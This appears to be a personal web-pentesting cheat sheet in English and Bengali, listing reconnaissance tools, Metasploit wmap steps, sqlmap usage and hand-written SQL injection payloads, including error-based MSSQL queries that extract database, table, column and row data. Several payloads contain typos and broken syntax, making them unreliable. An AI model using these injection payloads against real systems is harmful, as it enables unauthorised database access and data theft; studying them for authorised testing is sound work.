                         # information Gathering #
$netcraft website     // this website give you target website frontent and backend information.
$whatweb ip/website     // this tools command  help information gather information
=> when test a manula website , must flow this role:
            1. explore all feature and funtionaly
            2. create a account if possible 
            3. check site map
            4.surf all available url
            5. carefully notice all url query peramiter and sample
            6.carefully oberve hidden file and script ///example-jsp,asp,php
                    
                    #Analysis HTML source code#  
       1.take a close look at HTML source code target website
        2.obserb html comment
        3.carefully look link and img tag, this help you file system and directory
        4.look for distination for "action" attribute

                        # HTTPS headers analysis #
    use "httpwatch" software for analysis html ans http browser and server


                    #server site technology#
 # tools 
        burp
        whatweb
        technologyBuilwith  //website

                            # discover web hidden content #
     1.go->burp->siteMap   //এই খানে  hidden content পাওয়া যায়।
    2.example.com/sitemap.xml // সাইডম্যাপ hidden path পাওয়া যায়।
                            example.com/sitemap.xml.gz

                    # Mirror target website #
$ mirror terget website to find hidden info, file, directory and more.
$ httrack,wget,blackwindow // this tools use mirror website

                            # bruteforcing hideen content #
$ gobuster
$webr00t        // this is a script 
    $perl webr00t.pl -h https://example.com
    $ cewl www.example.com -d l -w example.txt   // this tools create a wordlsit target website .

                                    #some software #
$ vega, webInspect, Qualys // this are auto vulnerabality assisment tools


                        #Metaexploit with wmap#
service postgresql start
msfconsole
load wmap
step-1: wmap_site -a http://example.com //'a' means add
step-2: wmap_targets -t http://example.com/docs/index.php   //  't means terget/ here u give site any url, page_link,post_link,path_link
step-3: wmap_targets -l
step-4: wmap_run -t            //'t' for module  
step-5: wmap_run -e             //'e' for run scanner
setp-6: wmap_vulns -l           // for display scanning result

                            # web application fuzzing test #
                                sql injections
$ sql injections entry point http request follow as: 
    .GET method
    .POST method
    .cookie
    .user_agent
    .Reffer
    .Host
 $sqlmap --url example.com/asp.php?id=bad --dbs //এখানে id পর নাম থাকুক কিংবা নাম্বার থাকুম, আমরা salmap দিয়ে sqlmap দিয়ে test করবো।

                                        #database finger print #
$আমরা databaseকে force  করবো যাতে সে error message দেয়।যার মাধ্যমে info দেখাবে ।আমরা নিচের command গুলো দিতে পারিঃ
            'union select @@version() 1,1,1,1--     // this use usrname filed
            'group by columnnames having 1=1 --  // grouping error
            'Union Select 1,1,test,1,1 -


                                #Detect sql by peramiter manupulation#
$example.com/hame.php?catagori=bike | example.com/hame.php?catagori=bi'+'ke //microsoft server
$example.com/hame.php?catagori=bike | example.com/hame.php?catagori=attacker  //আগের অংশ রিয়েল, পরের অংশ attcker
$example.com/hame.php?catagori=bike | example.com/hame.php?catagori=bi''ke    //mysql  server
$example.com/hame.php?catagori=bike | example.com/hame.php?catagori=bi'||'ke  // postgresql abd orcal server

                                    #error based SQL injection  technique#  page-80
1.giev a (') single code on username field. if show error , its vulnerable . other it not vulnerable. // this is technique-1
                                                    technique-2
2.enter  'having 1=1 --  in the usrname field and password field any password. if show error it's vulnerable. error  message output you find table name and id .
                                                    technique-3
3.enter     'group by user_test.id having 1=1 -        username field and any password    //(group by user_test.id) this is find technique-2 error output 
            we find another error message ,here found usrname column . now we are extract usrname

                                                        technique-4
4. enter 'union select sum (username) from user_test    user field and give any password
    extract database name:
    -> example.com/index.aspx?id=1 or 1=convert(init,(DB_NAME)) --
    extract first database table:
    -> example.com/idex.aspx?id=1 or 1=convert(init,(select top 1 name from sysobjects where xtype=cahr(85)))--
     extract first database column name :
    -> example.com/idex.aspx?id=1 or 1=convert(init,(select top 1 column_name from DBNAME.information_schema.coloums where table_name="TABLE-NAME-1")) --
    extract first field and frist row:
    -> example.com/idex.aspx?id=1 or 1=convert(init, (select top 1 COLUMN_NAME-1 FROM-TABLE-NAME-1))--
